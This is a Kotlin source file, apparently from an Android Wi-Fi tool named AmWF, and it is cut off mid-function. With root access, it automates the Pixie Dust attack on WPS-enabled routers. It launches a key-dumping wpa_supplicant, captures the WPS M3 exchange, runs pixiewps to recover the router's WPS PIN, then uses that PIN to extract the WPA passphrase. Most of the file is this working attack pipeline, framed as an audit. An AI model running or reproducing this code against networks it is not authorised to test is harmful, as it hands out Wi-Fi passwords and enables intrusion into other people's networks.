/*
 * AmWF - Android WiFi Monitor Mode Controller
 * Copyright (C) 2026 Hitomatito
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package com.hitomatito.amwf.wifi.pixiedust

import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import android.util.Log
import com.hitomatito.amwf.R
import com.hitomatito.amwf.ShellExecutor
import com.hitomatito.amwf.destroyForciblyCompat
import com.hitomatito.amwf.isAliveCompat
import com.hitomatito.amwf.waitForCompat
import java.io.BufferedReader
import java.io.File
import java.io.InputStream
import java.io.InputStreamReader
import java.util.Collections
import java.util.concurrent.BlockingQueue
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import kotlin.coroutines.coroutineContext
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.ensureActive
import kotlinx.coroutines.isActive
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Orquestador del ataque Pixie Dust nativo.
 *
 * Flujo (implementación original de AmWF, GPL-3.0-or-later):
 *   1. Prepara binarios nativos (wpa_supplicant, wpa_cli, pixiewps, libnl) desde assets.
 *   2. Opcionalmente desactiva el WiFi del sistema (svc wifi disable) para liberar la interfaz.
 *   3. Lanza su propio wpa_supplicant con -K -d para volcar las claves WPS
 *      completas por stdout (binario sin CONFIG_ANDROID_LOG; el de Android
 *      las truncaría a 32 bytes en logcat).
 *   4. Espera el socket de control y verifica respuesta PONG vía wpa_cli.
 *   5. Envía wps_reg con un PIN conocido para provocar el intercambio M3.
 *   6. Parsea los 6 campos M3 (E-Nonce, PKE, PKR, AuthKey, E-Hash1, E-Hash2).
 *   7. Ejecuta pixiewps con esos argumentos y recupera el PIN WPS.
 *   8. Opcionalmente obtiene el PSK WPA mediante provisión WPS con el PIN hallado.
 *   9. Limpia procesos y restaura el estado del WiFi en [finally].
 *
 * @param context Contexto de la aplicación.
 * @param ioDispatcher Dispatcher para operaciones de E/S (inyectado para testabilidad).
 */
class PixieDustRunner(
    private val context: Context,
    private val ioDispatcher: CoroutineDispatcher = Dispatchers.IO,
    private val onLog: (String) -> Unit = {},
    private val onStage: (PixieDustStage) -> Unit = {}
) {

    // Expresión regular para extraer el PIN WPS de la salida de pixiewps.
    private val PIN_REGEX =
        Regex("""(\[\+\]\s*WPS\s*PIN:\s*|\[\+\]\s*WPS\s*pin:\s*)'?([\d]{4,8})'?""")

    // Validación estricta de BSSID (evita inyección de comandos en shell).
    private val BSSID_REGEX = Regex("^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")
    // Nombre de interfaz alfanumérico simple (evita inyección).
    private val IFACE_REGEX = Regex("^[a-zA-Z0-9]+$")

    // Límites de tiempo y reintentos.
    private val MAX_ATTACK_ROUNDS = 3
    private val SOCKET_WAIT_MS = 8_000L
    private val M3_CAPTURE_TIMEOUT_MS = 25_000L
    private val PSK_EXTRACT_TIMEOUT_MS = 45_000L
    private val PSK_WAIT_MS = 25_000L
    private val PIXIEWPS_TIMEOUT_MS = 60_000L

    // PIN conocido usado para el registro wps_reg (provoca el intercambio M3).
    private val WPS_REG_PIN_DEFAULT = "12345670"

    private val wifiManager =
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager

    /**
     * Mensajes de alto nivel del ataque (decisiones, PIN hallado, PSK, etc.).
     * Las líneas crudas del supplicant/pixiewps se guardan aparte en
     * `rawOutput` para no duplicarlas en el log de auditoría.
     *
     * `log()` puede invocarse desde el hilo lector del supplicant, así que la
     * lista debe ser segura para acceso concurrente.
     */
    private val auditEvents = Collections.synchronizedList(mutableListOf<String>())

    /**
     * true solo si esta ejecución desactivó un WiFi que estaba encendido.
     * Se usa en [cleanup] para no encender el WiFi del usuario si ya estaba
     * apagado antes de empezar.
     */
    @Volatile
    private var wifiDisabledByAttack = false

    /**
     * Ejecuta una auditoría Pixie Dust contra el BSSID dado.
     *
     * @param bssid Dirección MAC del objetivo (validada estrictamente).
     * @param interfaceName Nombre de la interfaz WiFi (por defecto "wlan0").
     * @param ssid SSID de la red (opcional, necesario para extraer el PSK).
     * @param freqMHz Frecuencia en MHz (opcional).
     * @param disableWifiBeforeAttack Si true, desactiva el WiFi del sistema antes de atacar.
     * @return [PixieDustResult] con el resultado de la auditoría.
     */
    suspend fun runAttack(
        bssid: String,
        interfaceName: String = "wlan0",
        ssid: String? = null,
        freqMHz: Int? = null,
        disableWifiBeforeAttack: Boolean = true
    ): PixieDustResult = withContext(ioDispatcher) {
        ensureActive()
        auditEvents.clear()
        stage(PixieDustStage.PREPARING)

        log("[*] ===== PIXIE DUST ATTACK START =====")
        log("[*] BSSID: $bssid | Interface: $interfaceName | SSID: $ssid | freq: ${freqMHz ?: "unknown"}")
        log("[*] Arch suffix: ${NativeBinaries.archSuffix()}")

        // --- Validaciones de entrada (seguridad: evita inyección de comandos) ---
        if (!BSSID_REGEX.matches(bssid)) {
            return@withContext PixieDustResult.Failure(
                bssid = bssid,
                reason = "Invalid BSSID format: $bssid",
                rawOutput = ""
            )
        }
        if (!IFACE_REGEX.matches(interfaceName)) {
            return@withContext PixieDustResult.Failure(
                bssid = bssid,
                reason = "Invalid interface name: $interfaceName",
                rawOutput = ""
            )
        }

        // --- Preparar binarios nativos (best-effort: copia los assets a filesDir) ---
        // Debe ejecutarse ANTES de comprobar faltantes: en el primer arranque
        // los binarios empaquetados aún no están copiados.
        log("[*] Preparing native binaries...")
        NativeBinaries.ensure(context)

        val missing = NativeBinaries.missingCriticalBinaries(context)
        if (missing.isNotEmpty()) {
            log("[-] Missing native assets: ${missing.joinToString(", ")}")
            val reasonRes = if (NativeBinaries.archSuffix() == "_32") {
                R.string.pixie_native_missing_32
            } else {
                R.string.pixie_native_missing
            }
            return@withContext PixieDustResult.Failure(
                bssid = bssid,
                reason = context.getString(reasonRes, NativeBinaries.displayNames(missing)),
                rawOutput = ""
            )
        }
        log("[+] Native binaries ready")

        stage(PixieDustStage.DISABLING_WIFI)

        // --- Desactivar WiFi del sistema si se solicita ---
        // Solo se restaura al terminar si estaba encendido antes: nunca se
        // enciende el WiFi del usuario si lo tenía apagado.
        val wifiWasEnabled = wifiManager?.isWifiEnabled == true
        wifiDisabledByAttack = false
        if (disableWifiBeforeAttack && wifiWasEnabled) {
            log("[*] Disabling system WiFi (svc wifi disable)...")
            val wifiOff = execSu("svc wifi disable", timeoutSeconds = 5)
            log("[*] svc wifi disable -> exit=${wifiOff.exitCode}")
            // Se marca aunque el comando falle: si llegó a desactivar la
            // interfaz antes de expirar, cleanup debe intentar restaurarla.
            wifiDisabledByAttack = true
            if (wifiOff.exitCode == 0) {
                try {
                    delay(2000)
                } catch (e: CancellationException) {
                    // El try/finally del ataque aún no se ha alcanzado. Si
                    // cancelan en este punto, hay que restaurar el WiFi aquí
                    // o se quedaría apagado hasta que el usuario lo active.
                    cleanup()
                    throw e
                }
            } else {
                log("[!] Warning: svc wifi disable returned non-zero; will restore WiFi state anyway")
            }
        } else if (disableWifiBeforeAttack) {
            log("[*] System WiFi already off; skipping svc wifi disable")
        }

        var m3Data: M3Parser.M3Data? = null
        var m5m7: M3Parser.M5M7Capture? = null
        var captureReason: String? = null
        var rawOutput = StringBuilder()
        var currentSupplicant: SupplicantHandle? = null
        // Resultado final para el log de auditoría: `finally` no puede leer
        // las variables locales de cada `return`, así que se conserva aquí.
        var auditResult: PixieDustResult? = null

        try {
            // Intentar capturar el M3 en varias rondas (frescas claves DH cada ronda).
            for (round in 1..MAX_ATTACK_ROUNDS) {
                ensureActive()
                if (round > 1) {
                    log("[*] M3 capture failed in previous round, restarting supplicant for round $round/$MAX_ATTACK_ROUNDS")
                    delay(1000)
                }

                stopSupplicant(currentSupplicant?.process)
                currentSupplicant = null
                val supplicant = startAttackSupplicant(interfaceName, log = ::log) ?: run {
                    captureReason = "wpa_supplicant socket was not created (SELinux may be blocking it)"
                    break
                }
                currentSupplicant = supplicant

                val attempt = captureM3(
                    supplicant = supplicant,
                    bssid = bssid,
                    interfaceName = interfaceName,
                    log = ::log,
                    rawOutput = rawOutput
                )
                m3Data = attempt.data
                m5m7 = attempt.m5m7
                captureReason = attempt.failureReason

                if (m3Data != null) {
                    log("[+] M3 captured (round $round/$MAX_ATTACK_ROUNDS)")
                    stopSupplicant(supplicant.process)
                    currentSupplicant = null
                    break
                }
                if (attempt.terminal) {
                    // El AP abortó la negociación (p. ej. WPS Setup Locked).
                    // Reiniciar el supplicant no cambia el estado del AP, así
                    // que no tiene sentido consumir las rondas restantes.
                    // El motivo se registra una sola vez al salir del bucle.
                    break
                }
            }

            if (m3Data == null) {
                val reason = captureReason ?: "Not enough data to run Pixie Dust attack"
                log("[-] $reason")
                val failure = PixieDustResult.Failure(
                    bssid = bssid,
                    reason = reason,
                    rawOutput = rawOutput.toString()
                )
                auditResult = failure
                return@withContext failure
            }

            log("[+] M3 captured:")
            log("    E-Nonce: ${m3Data.enrolleeNonce}")
            log("    PKE (peer key): ${m3Data.peerPublicKey}")
            log("    PKR (own key): ${m3Data.ownPublicKey}")
            log("    AuthKey: ${m3Data.authKey}")
            log("    E-Hash1: ${m3Data.eHash1}")
            log("    E-Hash2: ${m3Data.eHash2}")

            val capturedM3 = m3Data
            val capturedM5M7 = m5m7
            if (capturedM5M7 != null && capturedM5M7.hasBoth()) {
                log(
                    "[*] Pixiewps mode 3 (RTL819x): " +
                        "M5=${capturedM5M7.m5Enc?.length ?: 0} hex, " +
                        "M7=${capturedM5M7.m7Enc?.length ?: 0} hex"
                )
            } else {
                log("[*] Pixiewps args: ${capturedM3.toPixiewpsArgs()}")
            }

            // --- Ejecutar pixiewps ---
            stage(PixieDustStage.ANALYZING)
            log("[*] Running pixiewps ...")
            val pixieCmd = buildPixieCommand(capturedM3, capturedM5M7)
            log("[*] Pixiewps command: $pixieCmd")

            val wpsPin = runPixieCommand(pixieCmd, rawOutput)
            log(if (wpsPin != null) "[+] WPS PIN found: $wpsPin" else "[-] WPS pin not found")

            var wpaPsk: String? = null
            val targetSsid = ssid?.takeIf { it.isNotBlank() }
            if (wpsPin != null && targetSsid != null) {
                stage(PixieDustStage.EXTRACTING_PSK)
                log("[*] Obtaining WPA PSK via WPS provisioning...")
                wpaPsk = obtainWpsPsk(
                    bssid = bssid,
                    iface = interfaceName,
                    ssid = targetSsid,
                    pin = wpsPin,
                    log = ::log
                )
                if (wpaPsk != null) {
                    log("[+] WPA PSK obtained: $wpaPsk")
                } else {
                    log("[-] WPA PSK not obtained")
                }
            } else if (wpsPin != null) {
                log("[*] Skipping PSK extraction (SSID unknown or empty)")
            }

            if (wpsPin != null) {
                val success = PixieDustResult.Success(
                    bssid = bssid,
                    ssid = ssid,
                    wpsPin = wpsPin,
                    wpaPsk = wpaPsk,
                    rawOutput = rawOutput.toString()
                )
                auditResult = success
                return@withContext success
            } else {
                val failure = PixieDustResult.Failure(
                    bssid = bssid,
                    reason = "Target is not vulnerable to the Pixie Dust attack (WPS pin not found)",
                    rawOutput = rawOutput.toString()
                )
                auditResult = failure
                return@withContext failure
            }

        } finally {
            cleanup()
            // Guardar log de auditoría para análisis offline. Se ejecuta
            // después de cleanup() para incluir también sus mensajes.
            try {
                // `Collections.synchronizedList` exige sincronizar la
                // iteración: el hilo lector del supplicant aún podría estar
                // añadiendo líneas mientras se construye el snapshot.
                val events = synchronized(auditEvents) { auditEvents.toList() }
                    .filterNot {
                        it.startsWith("[supplicant]") ||
                            it.startsWith("[pixiewps-stderr]")
                    }
                saveAuditLog(
                    result = auditResult,
                    target = AuditTarget(bssid, ssid, freqMHz, interfaceName),
                    eventLines = events,
                    rawLines = rawOutput.toString().lines()
                )
            } catch (e: Exception) {
                ShellExecutor.logE(TAG, "Error saving audit log in finally block", e)
            }
        }
    }

    /**
     * Cancela cualquier proceso en curso y restaura el estado del WiFi.
     * Es bloqueante (ejecuta `su`), así que debe llamarse fuera del hilo
     * principal. Es idempotente.
     */
    fun cancel() {
        cleanup()
    }

    // ========================================================================
    // Pasos internos del ataque
    // ========================================================================

    private suspend fun startAttackSupplicant(
        iface: String,
        log: (String) -> Unit
    ): SupplicantHandle? {
        stage(PixieDustStage.STARTING_SUPPLICANT)
        val ctrlDir = NativeBinaries.ctrlDir()
        log("[*] Preparing ctrl dir: $ctrlDir")
        execSu("rm -rf $ctrlDir 2>/dev/null", timeoutSeconds = 3)
        execSu("mkdir -p $ctrlDir 2>/dev/null", timeoutSeconds = 3)
        execSu("chmod 777 $ctrlDir 2>/dev/null", timeoutSeconds = 3)

        if (!stageSupplicantConfig(ctrlDir, log)) {
            log("[-] No se pudo preparar el config del supplicant en $ctrlDir")
            return null
        }

        log("[*] Starting own wpa_supplicant (debug -d -K)...")
        val suppCmd = buildSupplicantCommand(iface, ctrlDir)
        log("[*] Supplicant command: $suppCmd")

        val process = Runtime.getRuntime().exec(arrayOf("su", "-c", suppCmd))
        val lines = LinkedBlockingQueue<String>()
        drainStream(process.inputStream, lines, M3Parser.END_OF_STREAM)

        val socketPath = "$ctrlDir/$iface"
        if (!waitForSocket(socketPath, SOCKET_WAIT_MS, log)) {
            log("[-] wpa_supplicant socket not created (SELinux may block): $socketPath")
            stopSupplicant(process)
            return null
        }
        if (!waitForInterfaceReady(iface, ctrlDir, log)) {
            log("[-] wpa_supplicant ctrl interface not ready to serve commands")
            stopSupplicant(process)
            return null
        }
        return SupplicantHandle(process, lines)
    }

    private fun buildSupplicantCommand(iface: String, ctrlDir: String): String {
        val dir = NativeBinaries.binaryDir(context)
        val supplicantPath = NativeBinaries.resolveBinaryPath(context, NativeBinaries.wpaSupplicantAssetName())
        val conf = NativeBinaries.runtimeConfigPath()
        // El watchdog comprueba el starttime de /proc/<pid>/stat (campo 22)
        // antes de matar. Así no puede terminar un proceso ajeno si el PID se
        // reutiliza durante los 110 s de espera, ni siquiera otro supplicant
        // de una ronda posterior que casualmente reciba el mismo PID.
        // Su stdout/stderr se redirigen a /dev/null: si heredara el pipe del
        // supplicant, el lector no recibiría EOF hasta 110 s después de que
        // el proceso terminase.
        // 2>&1: si el enlazador dinámico o la inicialización del driver fallan,
        // el motivo llega por stderr. Sin esto, el hilo lector solo ve stdout y
        // el arranque fallido queda invisible en la consola de la app.
        return "export LD_LIBRARY_PATH=$dir; $supplicantPath -d -Dnl80211 " +
                "-i $iface -c$conf -K -O$ctrlDir 2>&1 & pid=\$!; " +
                "start=\$(cut -d' ' -f22 /proc/\$pid/stat 2>/dev/null); " +
                "( sleep 110; [ -n \"\$start\" ] && " +
                "[ \"\$(cut -d' ' -f22 /proc/\$pid/stat 2>/dev/null)\" = \"\$start\" ] && " +
                "kill \$pid 2>/dev/null ) >/dev/null 2>&1 & wait \$pid"
    }

    private suspend fun waitForInterfaceReady(
        iface: String,
        ctrlDir: String,
        log: (String) -> Unit
    ): Boolean {
        val dir = NativeBinaries.binaryDir(context)
        val wpaCli = NativeBinaries.resolveBinaryPath(context, NativeBinaries.wpaCliAssetName())
        log("[*] Waiting for wpa_supplicant ctrl interface readiness (wpa_cli ping)...")
        val start = System.currentTimeMillis()
        val deadline = start + SOCKET_WAIT_MS
        while (System.currentTimeMillis() < deadline) {
            // `-s` fija el directorio del socket cliente de wpa_cli. Sin él,
            // wpa_cli intenta crearlo en su ruta por defecto (p. ej.
            // /data/misc/wifi/sockets), que no existe o no es escribible en
            // algunos dispositivos, y el ping falla con ENOENT/EACCES aunque
            // el supplicant esté sano.
            val r = runSuWithTimeout(
                wpaCliCommand(dir, ctrlDir, wpaCli, iface, "ping"),
                timeoutSeconds = 3
            )
            if (r.exitCode == 0 && r.output.lines().any { it.trim() == "PONG" }) {
                log("[+] wpa_supplicant ctrl interface ready (PONG)")
                return true
            }
            delay(250)
        }
        log("[-] wpa_supplicant ctrl interface not ready (no PONG)")
        return false
    }

    /** Resuelve el mensaje localizado de un error de configuración WPS. */
    private fun wpsFailureReason(configError: Int?): String {
        val reasonRes = M3Parser.configErrorReasonRes(configError)
        return if (configError == null) {
            context.getString(reasonRes)
        } else {
            context.getString(reasonRes, configError)
        }
    }

    private suspend fun captureM3(
        supplicant: SupplicantHandle,
        bssid: String,
        interfaceName: String,
        log: (String) -> Unit,
        rawOutput: StringBuilder
    ): M3Attempt = coroutineScope {
        val maxAttempts = 3
        var lastIncomplete: M3Parser.M3Capture.Incomplete? = null
        var anyRegAccepted = false

        for (attempt in 1..maxAttempts) {
            ensureActive()
            if (attempt > 1) {
                log("[-] M3 incomplete, retrying wps_reg (attempt $attempt/$maxAttempts)...")
                delay(1000)
            }

            // Descartar líneas de la ronda anterior (p. ej. un WPS-FAIL que
            // llegó tarde). Si no se hace, el parser puede consumir ese FAIL
            // antes del M3 de la ronda actual y abortar los reintentos.
            discardStaleLines(supplicant.lines)

            stage(PixieDustStage.REGISTERING_WPS)
            log("[*] Sending wps_reg with PIN $WPS_REG_PIN_DEFAULT...")
            val regResult = sendWpsReg(bssid, interfaceName, log)
            rawOutput.append(regResult.output).append("\n")

            if (!isWpsRegAccepted(regResult)) {
                log("[-] wps_reg not accepted (exit=${regResult.exitCode}), retrying...")
                delay(750)
                continue
            }
            anyRegAccepted = true

            stage(PixieDustStage.CAPTURING_M3)
            log("[*] Capturing M3 fields...")
            // M3Parser gestiona su propio timeout; envolverlo en withTimeout
            // podía descartar un M3 completo que llegara justo en el límite.
            val capture = M3Parser.parse(
                lines = supplicant.lines,
                timeoutMs = M3_CAPTURE_TIMEOUT_MS,
                cancelRequested = { !isActive },
                onLine = { line ->
                    log("[supplicant] $line")
                    rawOutput.append(line).append('\n')
                },
                onM5M7 = { d ->
                    log("[*] WPS-M5/M7 captured: M5=${d.m5Enc?.length ?: 0} hex, M7=${d.m7Enc?.length ?: 0} hex")
                }
            )

            when (capture) {
                is M3Parser.M3Capture.Complete ->
                    return@coroutineScope M3Attempt(capture.data, null, capture.m5m7)
                is M3Parser.M3Capture.Incomplete -> {
                    lastIncomplete = capture
                    log("[-] M3 capture incomplete: ${capture.capturedCount}/6, missing: ${capture.missing.joinToString()}")
                }
                is M3Parser.M3Capture.Failed -> {
                    // El AP abortó la sesión (p. ej. WPS bloqueado). Reintentar
                    // de inmediato no sirve: el bloqueo no se libera en segundos.
                    // El motivo se registra una sola vez en runAttack.
                    return@coroutineScope M3Attempt(
                        data = null,
                        failureReason = wpsFailureReason(capture.configError),
                        m5m7 = null,
                        terminal = true
                    )
                }
            }
        }

        val reason = when {
            !anyRegAccepted ->
                "wpa_supplicant did not accept wps_reg. Possible causes: interface not ready, WPS disabled, or WPS locked."
            lastIncomplete != null ->
                "WPS data capture incomplete after $maxAttempts attempts " +
                        "(${lastIncomplete.capturedCount}/6 fields, missing: ${lastIncomplete.missing.joinToString(", ")}). " +
                        "Possible causes: weak signal, WPS disabled, or WPS locked."
            else -> "WPS data capture failed"
        }
        return@coroutineScope M3Attempt(null, reason, null)
    }

    /**
     * Construye una invocación de wpa_cli con el entorno del supplicant
     * empaquetado: el binario y libnl viven en [dir], y `-p`/`-s` apuntan al
     * directorio de control para no depender de rutas del sistema.
     */
    private fun wpaCliCommand(
        dir: String,
        ctrlDir: String,
        wpaCli: String,
        iface: String,
        args: String
    ): String =
        "cd $dir && export LD_LIBRARY_PATH=$dir && " +
            "$wpaCli -p$ctrlDir -s$ctrlDir -i $iface $args"

    private fun sendWpsReg(
        bssid: String,
        iface: String,
        log: (String) -> Unit
    ): ShellExecutor.Result {
        val dir = NativeBinaries.binaryDir(context)
        val ctrlDir = NativeBinaries.ctrlDir()
        val wpaCli = NativeBinaries.resolveBinaryPath(context, NativeBinaries.wpaCliAssetName())
        // wpa_cli 2.11 solo acepta `wps_reg <BSSID> <PIN>` (o 6 argumentos
        // para reconfigurar el AP). No existe un argumento `freq=`: la
        // frecuencia la deduce wpa_supplicant del BSS escaneado.
        val cmd = wpaCliCommand(
            dir,
            ctrlDir,
            wpaCli,
            iface,
            "wps_reg $bssid $WPS_REG_PIN_DEFAULT"
        )
        log("[*] wpa_cli (wps_reg): $cmd")
        return runSuWithTimeout(cmd, timeoutSeconds = 5)
    }

    private fun isWpsRegAccepted(result: ShellExecutor.Result): Boolean =
        result.exitCode == 0 && result.output.lines().any { it.trim() == "OK" }

    private suspend fun runPixieCommand(command: String, rawOutput: StringBuilder): String? {
        coroutineContext.ensureActive()
        log("[*] pixiewps started")
        var wpsPin: String? = null
        var process: Process? = null
        val stdout = LinkedBlockingQueue<String>()
        val stderr = LinkedBlockingQueue<String>()
        return try {
            val running = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            process = running
            drainStream(running.inputStream, stdout)
            drainStream(running.errorStream, stderr)

            val deadline = System.currentTimeMillis() + PIXIEWPS_TIMEOUT_MS
            var timedOut = false
            while (true) {
                coroutineContext.ensureActive()
                val remaining = deadline - System.currentTimeMillis()
                if (remaining <= 0L) {
                    timedOut = true
                    break
                }
                val line = stdout.poll(minOf(remaining, 250L), TimeUnit.MILLISECONDS)
                    ?: continue
                if (line == PROCESS_EOF) break
                rawOutput.append(line).append('\n')
                log(line)
                PIN_REGEX.find(line)?.let { wpsPin = it.groupValues[2] }
                drainQueue(stderr, rawOutput, "[pixiewps-stderr] ")
            }

            if (timedOut) {
                log("[-] pixiewps timed out after ${PIXIEWPS_TIMEOUT_MS / 1000}s; killing it")
                running.destroyForciblyCompat()
            }
            drainQueue(stderr, rawOutput, "[pixiewps-stderr] ")
            try {
                running.waitFor()
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
            }
            drainQueue(stdout, rawOutput)
            drainQueue(stderr, rawOutput, "[pixiewps-stderr] ")
            val exitCode = runCatching { running.exitValue() }.getOrDefault(-1)
            log("[*] pixiewps exit code: $exitCode")
            wpsPin
        } catch (e: CancellationException) {
            process?.destroyForciblyCompat()
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Pixiewps execution failed", e)
            log("[-] Pixiewps execution error: ${e.message}")
            null
        } finally {
            process?.let { if (it.isAliveCompat()) it.destroyForciblyCompat() }
        }
    }

    /**
     * Lee un stream línea a línea en un hilo daemon. [onEnd] se ejecuta al
     * llegar a EOF o si el pipe se cierra, para encolar el centinela adecuado.
     */
    private fun drainLines(
        input: InputStream,
        onLine: (String) -> Unit,
        onEnd: () -> Unit = {}
    ) {
        Thread {
            try {
                BufferedReader(InputStreamReader(input)).use { reader ->
                    while (true) {
                        val line = reader.readLine() ?: break
                        onLine(line)
                    }
                }
            } catch (_: Exception) {
                // El proceso terminó o el pipe se cerró.
            } finally {
                onEnd()
            }
        }.apply {
            isDaemon = true
            start()
        }
    }

    /** Drena un stream en un hilo daemon y encola [eofMarker] al terminar. */
    private fun drainStream(
        input: InputStream,
        queue: BlockingQueue<String>,
        eofMarker: String = PROCESS_EOF
    ) {
        drainLines(input, { queue.offer(it) }, { queue.offer(eofMarker) })
    }

    /**
     * Descarta las líneas que quedaron sin consumir de una ronda anterior.
     * Se conserva el centinela de fin de stream: si el supplicant murió, el
     * parser debe enterarse en lugar de esperar hasta el timeout.
     */
    private fun discardStaleLines(queue: BlockingQueue<String>) {
        var sawEof = false
        while (true) {
            val line = queue.poll() ?: break
            if (line == M3Parser.END_OF_STREAM) sawEof = true
        }
        if (sawEof) queue.offer(M3Parser.END_OF_STREAM)
    }

    /** Vacía una cola de salida; [prefix] distingue stderr en el registro. */
    private fun drainQueue(
        queue: BlockingQueue<String>,
        rawOutput: StringBuilder,
        prefix: String = ""
    ) {
        while (true) {
            val line = queue.poll() ?: return
            if (line == PROCESS_EOF) continue
            rawOutput.append(line).append('\n')
            log(if (prefix.isEmpty()) line else "$prefix$line")
        }
    }

    /**
     * Construye el comando de línea para pixiewps a partir de los campos M3 capturados.
     */
    private fun buildPixieCommand(
        m3: M3Parser.M3Data,
        m5m7: M3Parser.M5M7Capture?
    ): String {
        val pixiePath = NativeBinaries.resolveBinaryPath(context, NativeBinaries.pixiewpsAssetName())
        return if (m5m7 != null && m5m7.hasBoth()) {
            "$pixiePath ${m5m7.toPixiewpsMode3Args(m3)}"
        } else {
            // `--force` solo aplica al modo 3 (bruteforce de fechas); en el
            // modo estándar se pasa únicamente el juego de claves M3.
            "$pixiePath ${m3.toPixiewpsArgs()}"
        }
    }

    private suspend fun obtainWpsPsk(
        bssid: String,
        iface: String,
        ssid: String,
        pin: String,
        log: (String) -> Unit
    ): String? = withTimeoutOrNull(PSK_EXTRACT_TIMEOUT_MS) {
        var process: Process? = null
        try {
            log("[*] ===== WPA PSK EXTRACTION (WPS with PIN $pin) =====")
            val ctrlDir = NativeBinaries.ctrlDir()
            stopSupplicant(null)
            execSu("rm -rf $ctrlDir 2>/dev/null", timeoutSeconds = 3)
            execSu("mkdir -p $ctrlDir 2>/dev/null", timeoutSeconds = 3)
            execSu("chmod 777 $ctrlDir 2>/dev/null", timeoutSeconds = 3)

            if (!stageSupplicantConfig(ctrlDir, log)) {
                log("[-] PSK stage: no se pudo preparar wpa_supplicant.conf")
                return@withTimeoutOrNull null
            }

            log("[*] Starting fresh wpa_supplicant for WPS provisioning...")
            val suppCmd = buildSupplicantCommand(iface, ctrlDir)
            val running = Runtime.getRuntime().exec(arrayOf("su", "-c", suppCmd))
            process = running
            drainLines(running.inputStream, onLine = { supLine -> log("[supplicant] $supLine") })

            val socketPath = "$ctrlDir/$iface"
            if (!waitForSocket(socketPath, SOCKET_WAIT_MS, log)) {
                log("[-] PSK stage: supplicant socket not created")
                return@withTimeoutOrNull null
            }
            if (!waitForInterfaceReady(iface, ctrlDir, log)) {
                log("[-] PSK stage: ctrl interface did not answer PONG")
                return@withTimeoutOrNull null
            }

            val dir = NativeBinaries.binaryDir(context)
            val wpaCli = NativeBinaries.resolveBinaryPath(context, NativeBinaries.wpaCliAssetName())
            fun cli(cmd: String): ShellExecutor.Result =
                runSuWithTimeout(
                    wpaCliCommand(dir, ctrlDir, wpaCli, iface, cmd),
                    timeoutSeconds = 5
                )

            fun cliChecked(cmd: String): ShellExecutor.Result {
                val result = cli(cmd)
                if (result.exitCode != 0 ||
                    result.output.lineSequence().any { it.trim() == "FAIL" }
                ) {
                    val detail = result.output.ifBlank { "exit=${result.exitCode}" }
                    log("[-] wpa_cli '$cmd' failed: $detail")
                }
                return result
            }

            var netId = "0"
            val addRes = cliChecked("add_network")
            addRes.output.lines().firstOrNull { it.trim().toIntOrNull() != null }?.let { netId = it.trim() }
            log("[+] Network id = $netId")

            // El SSID viene del escaneo y puede contener comillas, `$()` o
            // backticks: se cita para que el shell de `su` lo trate como un
            // único argumento y no ejecute nada.
            val safeSsid = ssid.replace('\r', ' ').replace('\n', ' ')
            cliChecked("set_network $netId ssid ${shellQuote(safeSsid)}")
            cliChecked("set_network $netId key_mgmt WPA-PSK")

            // Sin `freq=`: wpa_cli 2.11 solo acepta BSSID y PIN (o los
            // seis argumentos de reconfiguración del AP). Tampoco se llama a
            // select_network: abortaría la sesión WPS recién iniciada.
            var regAccepted = false
            for (attempt in 1..2) {
                val regResult = cli("wps_reg $bssid $pin")
                val rejected = regResult.exitCode != 0 ||
                    regResult.output.lineSequence().any { it.trim() == "FAIL" }
                if (!rejected) {
                    regAccepted = true
                    break
                }
                val detail = regResult.output.ifBlank { "exit=${regResult.exitCode}" }
                log("[-] wps_reg rejected (attempt $attempt/2): $detail")
                if (attempt < 2) delay(1000)
            }
            if (!regAccepted) {
                log("[-] PSK stage: wps_reg was rejected; aborting PSK extraction")
                return@withTimeoutOrNull null
            }

            log("[*] Waiting for WPS provisioning & PSK (up to ${PSK_WAIT_MS / 1000}s)...")
            val deadline = System.currentTimeMillis() + PSK_WAIT_MS
            var psk: String? = null
            while (System.currentTimeMillis() < deadline) {
                // wps_reg crea su propia red WPS con un id nuevo; no se puede
                // asumir que sea el de add_network. Se consultan todas las
                // redes conocidas y también el id devuelto por add_network.
                val ids = (listNetworkIds(::cli) + netId).distinct()
                val found = ids.asSequence()
                    .map { extractPskValue(cli("get_network $it psk")) }
                    .firstOrNull { !it.isNullOrEmpty() }
                if (found != null) {
                    psk = found
                    break
                }
                delay(1000)
            }

            if (psk == null) {
                log("[*] PSK not in control interface — trying save_config...")
                cli("save_config")
                psk = parsePskFromConfig()
            }

            if (psk != null) log("[+] WPA PSK: $psk") else log("[-] No PSK obtained from WPS exchange")
            return@withTimeoutOrNull psk
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "PSK extraction failed", e)
            log("[-] PSK extraction error: ${e.message}")
            return@withTimeoutOrNull null
        } finally {
            stopSupplicant(process)
        }
    }

    /**
     * Cita un valor para que el shell lo reciba como un único argumento.
     * El patrón `'` → `'\''` es la forma POSIX de meter una comilla simple
     * dentro de una cadena entrecomillada con comillas simples.
     */
    private fun shellQuote(value: String): String =
        "'" + value.replace("'", "'\\''") + "'"

    /**
     * Extrae los ids de red de la salida de `wpa_cli list_networks`.
     * El formato es `id<TAB>ssid<TAB>bssid<TAB>flags`, con una cabecera que
     * empieza por "network id" y por tanto no se confunde con un id.
     */
    private fun listNetworkIds(cli: (String) -> ShellExecutor.Result): List<String> =
        cli("list_networks").output.lineSequence()
            .mapNotNull { line -> line.trim().takeWhile { it.isDigit() }.toIntOrNull()?.toString() }
            .distinct()
            .toList()

    private fun extractPskValue(result: ShellExecutor.Result): String? {
        if (result.exitCode != 0) return null
        val line = result.output.lines().firstOrNull { l ->
            val t = l.trim()
            t.isNotEmpty() && t != "OK" &&
                    !t.startsWith("Selected interface") &&
                    !t.startsWith("Using interface") &&
                    !t.contains("UNKNOWN COMMAND", ignoreCase = true) &&
                    !t.contains("FAIL", ignoreCase = true)
        } ?: return null
